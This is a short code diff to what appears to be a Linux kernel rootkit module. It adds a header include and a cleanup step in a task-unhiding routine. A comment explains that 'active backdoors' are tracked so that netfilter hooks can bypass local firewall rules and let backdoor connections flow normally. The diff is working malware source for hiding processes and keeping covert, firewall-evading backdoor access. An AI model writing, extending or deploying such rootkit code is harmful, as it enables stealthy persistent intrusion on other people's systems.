@@ -13,6 +13,7 @@
 #endif
 #include <linux/tcp.h>
 #include <linux/kthread.h>
+#include <linux/inet.h>
 #include "lkm.h"
 #include "fs.h"
 #include "netapp.h"
@@ -132,6 +133,19 @@ static int _unhide_task(void *data) {
 #else
     kaddr->k_attach_pid(task, PIDTYPE_PID);
 #endif
+
+    /**
+     * For active backdoors, saddr should match the active outgoing
+     * connection. In sock.c I keep references for them in a list,that is needed
+     * because of active nf hooks that bypass the local firewall, so for each packet
+     * coming to a destination I can distinguish if that packet belongs to a backdoor.
+     * If there is a nettfilter rules blocking that connection, it will be bypassed and
+     * the connection will flow normally, but if the backdoor task is being unhidden then
+     * I need to cleanup that reference because the task will be killed soon afterwards.
+     */
+    if (ht->saddr) {
+        kv_bd_cleanup_item(&ht->saddr);
+    }
 
     prinfo("unhide [%p] %s : %d\n", task, task->comm, task->pid);
     return 0;
